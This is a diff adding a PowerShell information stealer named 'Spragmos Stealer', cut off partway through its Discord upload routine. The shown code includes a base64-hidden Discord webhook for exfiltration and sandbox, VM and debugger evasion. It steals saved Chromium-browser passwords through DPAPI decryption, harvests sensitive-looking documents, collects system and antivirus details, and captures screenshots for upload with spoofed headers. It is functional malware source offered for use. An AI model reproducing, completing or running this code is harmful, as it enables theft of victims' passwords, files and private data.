@@ -1,0 +1,1383 @@
+<#
+Spragmos Stealer
+1. Advanced browser credential extraction 
+2. Target document collection
+3. Enhanced persistence mechanisms  
+4. Advanced anti-analysis techniques
+5. Modular design with automatic dependency resolution
+#>
+
+# --- CONFIG (Base64 Encoded) ---
+$WEBHOOK = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NDkyNDU2MjkxMDgxMDExMi81OGM4WkVxQTV5SkQ4ZnN6RGJlZzJtYmg0cmJpVFJtZ0N0STQ0Rzc4czczSmQ4a2NyT2lqQ3hMbjZ3MFgtaC1EMlgxSA=="))
+$PERSIST = $true
+$MAX_FILE_SIZE = 10MB  # 10MB max for Discord uploads
+$DEBUG_MODE = $false
+
+# --- Core logging function ---
+function Write-SpragmosLog {
+    param(
+        [string]$Message,
+        [ValidateSet("INFO", "WARNING", "ERROR", "SUCCESS")]
+        [string]$Level = "INFO"
+    )
+    
+    if (-not $DEBUG_MODE) { return }
+    
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logMessage = "[$timestamp] [$Level] $Message"
+    
+    $logDir = "$env:TEMP\logs"
+    if (-not (Test-Path $logDir)) {
+        New-Item -Path $logDir -ItemType Directory -Force | Out-Null
+    }
+    
+    $logFile = "$logDir\spragmos.log"
+    Add-Content -Path $logFile -Value $logMessage -Force
+    
+    # Console output for debugging
+    switch ($Level) {
+        "INFO"    { Write-Host $logMessage -ForegroundColor Gray }
+        "WARNING" { Write-Host $logMessage -ForegroundColor Yellow }
+        "ERROR"   { Write-Host $logMessage -ForegroundColor Red }
+        "SUCCESS" { Write-Host $logMessage -ForegroundColor Green }
+    }
+}
+
+# --- DEPENDENCY MANAGER ---
+function Ensure-Dependency {
+    param(
+        [string]$Name,
+        [string]$Type,
+        [string]$SourceUrl,
+        [string]$DestinationPath
+    )
+    
+    Write-SpragmosLog "Checking dependency: $Name" -Level "INFO"
+    
+    switch ($Type) {
+        "Assembly" {
+            try {
+                # Try to load the assembly if it exists
+                Add-Type -AssemblyName $Name -ErrorAction Stop
+                Write-SpragmosLog "Assembly $Name already loaded" -Level "SUCCESS"
+                return $true
+            }
+            catch {
+                try {
+                    # If the assembly is available as a .dll file, load it
+                    $dllPaths = @(
+                        "$env:TEMP\$Name.dll",
+                        ".\$Name.dll",
+                        "$DestinationPath\$Name.dll"
+                    )
+                    
+                    foreach ($path in $dllPaths) {
+                        if (Test-Path $path) {
+                            Add-Type -Path $path -ErrorAction Stop
+                            Write-SpragmosLog "Loaded $Name from $path" -Level "SUCCESS"
+                            return $true
+                        }
+                    }
+                    
+                    # If we reached here, we need to download it
+                    if (-not (Test-Path $DestinationPath)) {
+                        New-Item -Path $DestinationPath -ItemType Directory -Force | Out-Null
+                    }
+                    
+                    Write-SpragmosLog "Downloading $Name from $SourceUrl" -Level "INFO"
+                    
+                    # Create a WebClient for the download
+                    $webClient = New-Object System.Net.WebClient
+                    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+                    $downloadPath = "$DestinationPath\$(Split-Path $SourceUrl -Leaf)"
+                    $webClient.DownloadFile($SourceUrl, $downloadPath)
+                    
+                    # If it's a ZIP file, extract it
+                    if ($downloadPath -match "\.zip$") {
+                        Write-SpragmosLog "Extracting $downloadPath" -Level "INFO"
+                        Expand-Archive -Path $downloadPath -DestinationPath "$DestinationPath\extracted" -Force
+                        
+                        # Find and move the DLL
+                        $dllFile = Get-ChildItem -Path "$DestinationPath\extracted" -Filter "*.dll" -Recurse | 
+                                   Where-Object { $_.Name -match $Name } | 
+                                   Select-Object -First 1
+                        
+                        if ($dllFile) {
+                            Copy-Item -Path $dllFile.FullName -Destination "$DestinationPath\$Name.dll" -Force
+                            Add-Type -Path "$DestinationPath\$Name.dll" -ErrorAction Stop
+                            Write-SpragmosLog "Loaded $Name after extraction" -Level "SUCCESS"
+                            return $true
+                        }
+                    }
+                    else {
+                        # It's a direct DLL download
+                        $finalPath = "$DestinationPath\$Name.dll"
+                        Copy-Item -Path $downloadPath -Destination $finalPath -Force
+                        Add-Type -Path $finalPath -ErrorAction Stop
+                        Write-SpragmosLog "Loaded $Name after direct download" -Level "SUCCESS"
+                        return $true
+                    }
+                }
+                catch {
+                    Write-SpragmosLog "Failed to load ${Name}: $($_.Exception.Message)"
+                    return $false
+                }
+            }
+        }
+        
+        "Module" {
+            # PowerShell module handling
+            if (Get-Module -Name $Name -ListAvailable) {
+                Import-Module -Name $Name -ErrorAction SilentlyContinue
+                Write-SpragmosLog "Module $Name already available" -Level "SUCCESS"
+                return $true
+            }
+            
+            try {
+                # Attempt to download from PSGallery
+                Install-Module -Name $Name -Force -Scope CurrentUser -ErrorAction Stop
+                Import-Module -Name $Name -ErrorAction Stop
+                Write-SpragmosLog "Installed module $Name" -Level "SUCCESS"
+                return $true
+            }
+            catch {
+                Write-SpragmosLog "Failed to install module ${Name}: $($_.Exception.Message)"
+                return $false
+            }
+        }
+    }
+    
+    return $false
+}
+
+# --- Ensure SQLite for browser credential extraction ---
+function Ensure-SQLite {
+    $sqliteUrl = "https://www.sqlite.org/2023/sqlite-dll-win64-x64-3410200.zip"
+    $sqlitePath = "$env:TEMP\spragmos\dependencies"
+    
+    return (Ensure-Dependency -Name "System.Data.SQLite" -Type "Assembly" -SourceUrl $sqliteUrl -DestinationPath $sqlitePath)
+}
+
+# --- ANTI-ANALYSIS TECHNIQUES ---
+function Test-SafeEnvironment {
+    Write-SpragmosLog "Checking environment safety" -Level "INFO"
+    
+    # 1. Username and hostname checks
+    $suspiciousTerms = @(
+        "sandbox", "malware", "virus", "sample", "maltest", "test", "analyze", "analysis", 
+        "lab", "vm", "virtual", "vmware", "vbox", "cuckoo", "security"
+    )
+    
+    foreach ($term in $suspiciousTerms) {
+        if ($env:COMPUTERNAME -match $term -or $env:USERNAME -match $term) {
+            Write-SpragmosLog "Suspicious environment name detected" -Level "WARNING"
+            return $false
+        }
+    }
+    
+    # 2. Hardware profile checks
+    try {
+        $computerSystem = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue
+        $bios = Get-WmiObject Win32_BIOS -ErrorAction SilentlyContinue
+        
+        # VM detection
+        if ($computerSystem.Model -match "Virtual|VMware|VBox|HVM" -or 
+            $computerSystem.Manufacturer -match "QEMU|Xen|innotek|VMware" -or
+            $bios.SerialNumber -match "VMware|Virtual|VBox|0" -or
+            $bios.Manufacturer -match "VMware|VBOX") {
+            Write-SpragmosLog "Virtual environment detected" -Level "WARNING"
+            return $false
+        }
+        
+        # Resource check (VMs often have limited resources)
+        if ($computerSystem.TotalPhysicalMemory -lt 3GB -or
+            (Get-WmiObject Win32_Processor).NumberOfCores -lt 2) {
+            Write-SpragmosLog "Limited system resources detected" -Level "WARNING"
+            return $false
+        }
+    }
+    catch {
+        Write-SpragmosLog "Error checking hardware profile: $_" -Level "ERROR"
+    }
+    
+    # 3. Check for debuggers and monitoring tools
+    $suspiciousProcesses = @(
+        "wireshark", "procmon", "processhacker", "procexp", "ollydbg", "x96dbg", "x32dbg", "ida64", "ida", 
+        "ghidra", "dnspy", "dotpeek", "ilspy", "pestudio", "megadumper", "scylla", "immunity"
+    )
+    
+    foreach ($process in $suspiciousProcesses) {
+        if (Get-Process -Name $process -ErrorAction SilentlyContinue) {
+            Write-SpragmosLog "Monitoring tool detected: $process" -Level "WARNING"
+            return $false
+        }
+    }
+    
+    # 4. Check for debugging
+    if ([System.Diagnostics.Debugger]::IsAttached) {
+        Write-SpragmosLog "Debugger detected" -Level "WARNING"
+        return $false
+    }
+    
+    # 5. Check system uptime (sandboxes often have short uptime)
+    $uptime = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
+    if ($uptime.TotalMinutes -lt 10) {
+        Write-SpragmosLog "System recently booted, possible sandbox" -Level "WARNING"
+        return $false
+    }
+    
+    # 6. Check for recent file creation acceleration (common in sandboxes)
+    try {
+        $recentFiles = Get-ChildItem $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | 
+                    Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-30) }
+        if ($recentFiles.Count -gt 100) {
+            Write-SpragmosLog "High number of recently created files, possible sandbox activity" -Level "WARNING"
+            return $false
+        }
+    }
+    catch {
+        Write-SpragmosLog "Error checking file creation dates: $_" -Level "ERROR"
+    }
+    
+    # 7. Check for sandbox artifacts
+    $sandboxArtifacts = @(
+        "$env:SystemDrive\analysis",
+        "$env:ProgramFiles\VMware",
+        "$env:ProgramFiles\Oracle\VirtualBox Guest Additions",
+        "$env:SystemRoot\System32\drivers\vmmouse.sys",
+        "$env:SystemRoot\System32\drivers\vmhgfs.sys"
+    )
+    
+    foreach ($artifact in $sandboxArtifacts) {
+        if (Test-Path $artifact) {
+            Write-SpragmosLog "Sandbox artifact detected: $artifact" -Level "WARNING"
+            return $false
+        }
+    }
+    
+    # 8. Mouse cursor movement check
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        $initialPosition = [System.Windows.Forms.Cursor]::Position
+        Start-Sleep -Milliseconds 500
+        $newPosition = [System.Windows.Forms.Cursor]::Position
+        
+        if (($initialPosition.X -eq $newPosition.X) -and ($initialPosition.Y -eq $newPosition.Y)) {
+            # Additional check for legitimate idle machine vs sandbox
+            $idleTime = [Math]::Round(((Get-Date) - (Get-Process -Id $pid).StartTime).TotalSeconds)
+            if ($idleTime -lt 60) {  # If program just started and no mouse movement, suspicious
+                Write-SpragmosLog "No mouse movement detected in first minute, possible automated environment" -Level "WARNING"
+                return $false
+            }
+        }
+    }
+    catch {
+        Write-SpragmosLog "Error checking mouse movement: $_" -Level "ERROR"
+    }
+    
+    Write-SpragmosLog "Environment appears safe" -Level "SUCCESS"
+    return $true
+}
+
+# --- CREDENTIAL HARVESTER ---
+function Get-BrowserCredentials {
+    Write-SpragmosLog "Collecting browser credentials" -Level "INFO"
+    
+    # Ensure SQLite is available
+    if (-not (Ensure-SQLite)) {
+        Write-SpragmosLog "SQLite dependency not available, skipping browser credential extraction" -Level "ERROR"
+        return "SQLite dependency missing - could not extract credentials"
+    }
+    
+    $results = @()
+    
+    # Expanded browser paths
+    $browserPaths = @{
+        "Chrome" = @{
+            "PathPattern" = "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data"
+            "ProcessName" = "chrome"
+        }
+        "Edge" = @{
+            "PathPattern" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Login Data"
+            "ProcessName" = "msedge"
+        }
+        "Brave" = @{
+            "PathPattern" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\*\Login Data"
+            "ProcessName" = "brave"
+        }
+        "Opera" = @{
+            "PathPattern" = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
+            "ProcessName" = "opera"
+        }
+        "OperaGX" = @{
+            "PathPattern" = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"
+            "ProcessName" = "opera_gx"
+        }
+        "Vivaldi" = @{
+            "PathPattern" = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data"
+            "ProcessName" = "vivaldi"
+        }
+    }
+
+    foreach ($browser in $browserPaths.Keys) {
+        $paths = @()
+        try {
+            $pathPattern = $browserPaths[$browser]["PathPattern"]
+            $paths = Resolve-Path -Path $pathPattern -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
+        }
+        catch {
+            Write-SpragmosLog "Error resolving paths for ${browser}: $($_.Exception.Message)" -Level "ERROR"
+            continue
+        }
+        
+        if (-not $paths -or $paths.Count -eq 0) {
+            Write-SpragmosLog "No profiles found for $browser" -Level "INFO"
+            continue
+        }
+        
+        # Check if browser is running and attempt to extract
+        $isRunning = Get-Process -Name $browserPaths[$browser]["ProcessName"] -ErrorAction SilentlyContinue
+        if ($isRunning) {
+            Write-SpragmosLog "$browser is currently running, credentials may be locked" -Level "WARNING"
+        }
+        
+        foreach ($path in $paths) {
+            try {
+                Write-SpragmosLog "Processing $browser database at: $path" -Level "INFO"
+                
+                # Create temporary copy to avoid locks
+                $tempCopy = "$env:TEMP\$browser_$([System.IO.Path]::GetRandomFileName()).db"
+                
+                # Ensure any previous copies are removed
+                if (Test-Path $tempCopy) {
+                    Remove-Item $tempCopy -Force
+                }
+                
+                # Copy the database
+                Copy-Item -Path $path -Destination $tempCopy -Force -ErrorAction Stop
+                
+                # Establish SQLite connection
+                $connectionString = "Data Source=$tempCopy;Version=3;Read Only=True"
+                $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+                $connection.Open()
+                
+                # Create and execute command
+                $command = $connection.CreateCommand()
+                $command.CommandText = @"
+SELECT 
+    origin_url, 
+    username_value, 
+    password_value,
+    datetime(date_created / 1000000 - 11644473600, 'unixepoch', 'localtime') as creation_date,
+    datetime(date_last_used / 1000000 - 11644473600, 'unixepoch', 'localtime') as last_used
+FROM logins
+ORDER BY date_last_used DESC
+LIMIT 100
+"@
+                $reader = $command.ExecuteReader()
+                $credentialCount = 0
+                
+                # Process results
+                while ($reader.Read()) {
+                    try {
+                        $url = $reader["origin_url"]
+                        $username = $reader["username_value"]
+                        $encryptedPassword = $reader["password_value"]
+                        $creationDate = $reader["creation_date"]
+                        $lastUsed = $reader["last_used"]
+                        
+                        # Skip empty entries
+                        if ([string]::IsNullOrEmpty($username) -or $null -eq $encryptedPassword -or $encryptedPassword.Length -eq 0) {
+                            continue
+                        }
+                        
+                        # Decrypt password
+                        $decryptedPassword = ""
+                        try {
+                            $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                                $encryptedPassword,
+                                $null,
+                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                            )
+                            $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+                        }
+                        catch {
+                            $decryptedPassword = "[Decryption failed]"
+                            Write-SpragmosLog "Password decryption failed: $_" -Level "ERROR"
+                        }
+                        
+                        # Add to results
+                        $credential = @"
+[BROWSER]: $browser
+[URL]: $url
+[USERNAME]: $username
+[PASSWORD]: $decryptedPassword
+[CREATED]: $creationDate
+[LAST USED]: $lastUsed
+"@
+                        $results += $credential
+                        $credentialCount++
+                    }
+                    catch {
+                        Write-SpragmosLog "Error processing credential: $_" -Level "ERROR"
+                    }
+                }
+                
+                # Close resources
+                $reader.Close()
+                $connection.Close()
+                
+                # Clean up
+                Remove-Item $tempCopy -Force -ErrorAction SilentlyContinue
+                
+                Write-SpragmosLog "Extracted $credentialCount credentials from $browser" -Level "SUCCESS"
+            }
+            catch {
+                Write-SpragmosLog "Error processing $browser database: $_" -Level "ERROR"
+            }
+        }
+    }
+    
+    # Add Firefox support
+    try {
+        Write-SpragmosLog "Attempting to extract Firefox credentials" -Level "INFO"
+        
+        # Firefox profiles are stored differently
+        $firefoxProfilesPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+        if (Test-Path $firefoxProfilesPath) {
+            $firefoxProfiles = Get-ChildItem -Path $firefoxProfilesPath -Directory
+            
+            foreach ($profile in $firefoxProfiles) {
+                $loginFilePath = Join-Path $profile.FullName "logins.json"
+                $keyPath = Join-Path $profile.FullName "key4.db"
+                
+                if (Test-Path $loginFilePath) {
+                    Write-SpragmosLog "Found Firefox logins file: $loginFilePath" -Level "INFO"
+                    
+                    # For Firefox we would need NSS libraries to decrypt, which is complex
+                    # Simplified approach: just notify that Firefox credentials were found
+                    $firefoxSummary = @"
+[BROWSER]: Firefox
+[PROFILE]: $($profile.Name)
+[STATUS]: Credentials file found but decryption requires additional libraries
+[PATH]: $loginFilePath
+"@
+                    $results += $firefoxSummary
+                }
+            }
+        }
+        else {
+            Write-SpragmosLog "No Firefox profiles found" -Level "INFO"
+        }
+    }
+    catch {
+        Write-SpragmosLog "Error processing Firefox credentials: $_" -Level "ERROR"
+    }
+    
+    if ($results.Count -eq 0) {
+        return "No browser credentials found."
+    }
+    
+    return $results -join "`n`n-----------------------------------`n`n"
+}
+
+# --- DATA COLLECTOR ---
+function Find-InterestingFiles {
+    Write-SpragmosLog "Searching for interesting files" -Level "INFO"
+    
+    # Extended file patterns to search for
+    $filePatterns = @(
+        "*.pdf", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", 
+        "*.txt", "*.csv", "*.rtf", "*.json", "*.xml", "*.cfg", "*.config",
+        "*.rdp", "*.kdbx", "*.key", "*.cer", "*.crt", "*.pem", "*.pfx",
+        "*.ppk", "*.ps1", "*.bat", "*.sql", "*.db", "*.sqlite", "*.mdb",
+        "*.accdb", "*.one", "*.odt", "*.ods", "*.odp"
+    )
+    
+    # Keywords to prioritize files
+    $sensitiveKeywords = @(
+        "password", "credentials", "secret", "key", "token", "api", "admin",
+        "confidential", "private", "sensitive", "personal", "internal", "restricted",
+        "login", "account", "financial", "banking", "credit", "card", "ssn",
+        "social security", "tax", "salary", "payroll", "hr", "employee", "staff",
+        "customer", "client", "contract", "agreement", "nda", "intellectual property"
+    )
+    
+    # Places to search
+    $searchPaths = @(
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Downloads",
+        "$env:USERPROFILE\OneDrive",
+        "$env:USERPROFILE\OneDrive\Documents",
+        "$env:USERPROFILE\OneDrive\Desktop",
+        "$env:USERPROFILE\Dropbox"
+    )
+    
+    # Add mapped drives if any
+    $mappedDrives = Get-WmiObject -Class Win32_MappedLogicalDisk -ErrorAction SilentlyContinue | 
+                   Select-Object -ExpandProperty Name -ErrorAction SilentlyContinue
+    
+    if ($mappedDrives) {
+        $searchPaths += $mappedDrives
+        Write-SpragmosLog "Found mapped drives to search: $($mappedDrives -join ', ')" -Level "INFO"
+    }
+    
+    # Define excluded folders
+    $excludedFolders = @(
+        "Windows", "Program Files", "Program Files (x86)", "ProgramData", 
+        "AppData", "$env:LOCALAPPDATA", "$env:APPDATA"
+    )
+    
+    $interestingFiles = @()
+    
+    foreach ($path in $searchPaths) {
+        try {
+            # Skip if path doesn't exist
+            if (-not (Test-Path $path)) {
+                Write-SpragmosLog "Path not found, skipping: $path" -Level "INFO"
+                continue
+            }
+            
+            Write-SpragmosLog "Searching in: $path" -Level "INFO"
+            
+            # Use more efficient search technique
+            $files = Get-ChildItem -Path $path -Include $filePatterns -Recurse -File -ErrorAction SilentlyContinue -Depth 3 |
+                    Where-Object { 
+                        $_.Length -lt $MAX_FILE_SIZE -and
+                        $_.LastWriteTime -gt (Get-Date).AddDays(-90) -and
+                        -not $_.PSIsContainer -and
+                        -not $_.FullName.Contains("$env:ProgramFiles") -and
+                        -not $_.FullName.Contains("$env:ProgramFiles (x86)") -and
+                        -not $_.FullName.Contains("$env:SystemRoot") -and
+                        -not $_.FullName.StartsWith("$env:SystemDrive\Windows")
+                    }
+            
+            foreach ($file in $files) {
+                $priority = 1
+                
+                # Date-based priority
+                if ($file.LastWriteTime -gt (Get-Date).AddDays(-7)) { $priority += 3 }
+                elseif ($file.LastWriteTime -gt (Get-Date).AddDays(-30)) { $priority += 2 }
+                elseif ($file.LastWriteTime -gt (Get-Date).AddDays(-90)) { $priority += 1 }
+                
+                # Size-based priority (very small files might be config files)
+                if ($file.Length -lt 10KB) { $priority += 1 }
+                
+                # Check filename for sensitive keywords
+                foreach ($keyword in $sensitiveKeywords) {
+                    if ($file.Name -match $keyword) {
+                        $priority += 2
+                        break
+                    }
+                }
+                
+                # Check content for sensitive keywords (text files only)
+                if ($file.Extension -match "\.(txt|csv|xml|json|config|cfg|ini|ps1|bat|log|sql)$" -and $file.Length -lt 1MB) {
+                    try {
+                        $content = Get-Content -Path $file.FullName -TotalCount 100 -Raw -ErrorAction Stop
+                        foreach ($keyword in $sensitiveKeywords) {
+                            if ($content -match $keyword) {
+                                $priority += 2
+                                break
+                            }
+                        }
+                    }
+                    catch {
+                        Write-SpragmosLog "Cannot read file content: $($file.FullName)" -Level "ERROR"
+                    }
+                }
+                
+                # Add to results with priority info
+                $interestingFiles += [PSCustomObject]@{
+                    File = $file
+                    Priority = $priority
+                }
+            }
+        }
+        catch {
+            Write-SpragmosLog "Error searching path $path : $_" -Level "ERROR"
+        }
+    }
+    
+    # Sort by priority and return top results
+    $result = $interestingFiles | Sort-Object -Property Priority -Descending | Select-Object -First 20 -ExpandProperty File
+    
+    Write-SpragmosLog "Found $($result.Count) interesting files" -Level "SUCCESS"
+    return $result
+}
+
+# --- SYSTEM INFO COLLECTOR ---
+function Get-SystemInformation {
+    Write-SpragmosLog "Collecting system information" -Level "INFO"
+    
+    $info = [ordered]@{}
+    
+    try {
+        # Basic info
+        $info["ComputerName"] = $env:COMPUTERNAME
+        $info["UserName"] = $env:USERNAME
+        $info["Domain"] = $env:USERDOMAIN
+        $info["DateTime"] = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        
+        # OS details
+        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
+        if ($os) {
+            $info["OSName"] = $os.Caption
+            $info["OSVersion"] = $os.Version
+            $info["OSArchitecture"] = $os.OSArchitecture
+            $info["LastBoot"] = $os.LastBootUpTime.ToString("yyyy-MM-dd HH:mm:ss")
+            $info["Uptime"] = (New-TimeSpan -Start $os.LastBootUpTime -End (Get-Date)).ToString()
+            $info["InstallDate"] = $os.InstallDate.ToString("yyyy-MM-dd HH:mm:ss")
+        }
+        
+        # Hardware details
+        $cs = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
+        if ($cs) {
+            $info["Manufacturer"] = $cs.Manufacturer
+            $info["Model"] = $cs.Model
+            $info["PhysicalMemory"] = "{0:N2} GB" -f ($cs.TotalPhysicalMemory / 1GB)
+            $info["LogicalProcessors"] = $cs.NumberOfLogicalProcessors
+        }
+        
+        # Processor
+        $cpu = Get-CimInstance -ClassName Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($cpu) {
+            $info["ProcessorName"] = $cpu.Name
+            $info["ProcessorCores"] = $cpu.NumberOfCores
+        }
+        
+        # Disk information
+        $disks = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
+        if ($disks) {
+            $diskInfo = @()
+            foreach ($disk in $disks) {
+                $diskInfo += "{0} - {1:N2} GB total, {2:N2} GB free" -f $disk.DeviceID, ($disk.Size / 1GB), ($disk.FreeSpace / 1GB)
+            }
+            $info["DisksInfo"] = $diskInfo -join " | "
+        }
+        
+        # Network information
+        $networkAdapters = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" -ErrorAction SilentlyContinue
+        if ($networkAdapters) {
+            $networkInfo = @()
+            foreach ($adapter in $networkAdapters) {
+                $networkInfo += "{0}: {1} - {2}" -f $adapter.Description, ($adapter.IPAddress -join ", "), ($adapter.MACAddress)
+            }
+            $info["NetworkAdapters"] = $networkInfo -join " | "
+        }
+        
+        # Installed Antivirus
+        $antivirusProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue
+        if ($antivirusProducts) {
+            $avInfo = @()
+            foreach ($av in $antivirusProducts) {
+                $avInfo += "{0} - {1}" -f $av.displayName, $av.productState
+            }
+            $info["InstalledAntivirus"] = $avInfo -join " | "
+        }
+        else {
+            $info["InstalledAntivirus"] = "None detected"
+        }
+        
+        # User account information
+        $currentUserSID = (New-Object System.Security.Principal.NTAccount("$env:USERDOMAIN\$env:USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+        $info["UserSID"] = $currentUserSID
+        
+        # Check admin rights
+        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+        $info["IsAdministrator"] = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        
+        # Installed software (just count)
+        $installedSoftware = Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -ErrorAction SilentlyContinue
+        $info["InstalledSoftwareCount"] = ($installedSoftware | Measure-Object).Count
+        
+        # Important software
+        $importantSoftware = @(
+            "Office", "Visual Studio", "SQL Server", "Adobe", "AutoCAD", "Oracle", 
+            "SAP", "Citrix", "VMware", "Slack", "Teams", "Zoom", "Git", "Node", 
+            "Python", "Java", "Chrome", "Firefox", "Edge"
+        )
+        
+        $detectedSoftware = @()
+        foreach ($software in $importantSoftware) {
+            $matches = $installedSoftware | Where-Object { $_.GetValue("DisplayName") -match $software }
+            if ($matches) {
+                foreach ($match in $matches) {
+                    $detectedSoftware += $match.GetValue("DisplayName")
+                }
+            }
+        }
+        $info["ImportantSoftware"] = $detectedSoftware -join " | "
+        
+        # Running processes count
+        $info["RunningProcesses"] = (Get-Process | Measure-Object).Count
+        
+        # Check for VM
+        $vmCheck = Test-Hypervisor
+        $info["IsVirtualMachine"] = (-not $vmCheck)
+    }
+    catch {
+        Write-SpragmosLog "Error collecting system information: $_" -Level "ERROR"
+    }
+    
+    # Convert to string output
+    $result = foreach ($key in $info.Keys) {
+        "$key : $($info[$key])"
+    }
+    
+    return $result -join "`n"
+}
+
+# --- SCREENSHOT CAPTURE ---
+function Capture-Screenshot {
+    Write-SpragmosLog "Capturing screenshot" -Level "INFO"
+    
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        # Get screen size
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        
+        # Create bitmap and graphics objects
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        
+        # Capture screen
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+        
+        # Save to file
+        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        
+        # Cleanup
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        Write-SpragmosLog "Screenshot saved to $screenshotPath" -Level "SUCCESS"
+        return $screenshotPath
+    }
+    catch {
+        Write-SpragmosLog "Error capturing screenshot: $_" -Level "ERROR"
+        return $null
+    }
+}
+
+# --- DISCORD COMMUNICATION ---
+function Send-DiscordMessage {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$Message,
+        
+        [Parameter()]
+        [string]$FilePath = $null,
+        
+        [Parameter()]
+        [int]$MaxRetries = 3
+    )
+    
+    Write-SpragmosLog "Sending Discord message" -Level "INFO"
+    if ($FilePath) {
+        Write-SpragmosLog "With attachment: $FilePath" -Level "INFO"
+    }
+    
+    # Randomize delay to avoid pattern detection
+    $delay = Get-Random -Minimum 500 -Maximum 3000
+    Start-Sleep -Milliseconds $delay
+    
+    # Define boundary and build request
+    $boundary = [System.Guid]::NewGuid().ToString()
+    
+    # Helper function to create multipart form correctly
+    function Build-MultipartFormData {
+        param(
+            [string]$Boundary,
+            [string]$ContentDisposition,
+            [string]$Name,
+            [string]$Value
+        )
+        
+        $multipartContent = @"
+--$Boundary
+Content-Disposition: form-data; name="$Name"
+
+$Value
+
+"@
+        return $multipartContent
+    }
+    
+    for ($retryCount = 0; $retryCount -lt $MaxRetries; $retryCount++) {
+        try {
+            # Initialize request
+            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+            $request = [System.Net.WebRequest]::Create($WEBHOOK)
+            $request.Method = "POST"
+            $request.ContentType = "multipart/form-data; boundary=$boundary"
+            
+            # Setup fake headers to appear more legitimate
+            $userAgents = @(
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
+            )
+            
+            $request.UserAgent = $userAgents | Get-Random
+            $request.Headers.Add("Accept", "*/*")
+            $request.Headers.Add("Accept-Language", "en-US,en;q=0.9")
+            $request.Headers.Add("Accept-Encoding", "gzip, deflate, br")
+            $request.Headers.Add("X-Requested-With", "XMLHttpRequest")
+            $request.Headers.Add("Origin", "https://discord.com")
+            $request.Headers.Add("DNT", "1")
+            
+            # Build form data
+            $formData = Build-MultipartFormData -Boundary $boundary -Name "content" -Value $Message
+            
+            # Add file if specified
+            if ($FilePath -and (Test-Path $FilePath)) {
+                $fileName = [System.IO.Path]::GetFileName($FilePath)
+                $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+                
+                # Determine content type
+                $contentType = "application/octet-stream"
+                $extension = [System.IO.Path]::GetExtension($FilePath).ToLower()
+                
+                switch ($extension) {
+                    ".png"  { $contentType = "image/png" }
+                    ".jpg"  { $contentType = "image/jpeg" }
+                    ".jpeg" { $contentType = "image/jpeg" }
+                    ".gif"  { $contentType = "image/gif" }
+                    ".txt"  { $contentType = "text/plain" }
+                    ".pdf"  { $contentType = "application/pdf" }
+                    ".doc"  { $contentType = "application/msword" }
+                    ".docx" { $contentType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document" }
+                    ".xls"  { $contentType = "application/vnd.ms-excel" }
+                    ".xlsx" { $contentType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }
+                }
+                
+                # Add file header
+                $formData += @"
+--$boundary
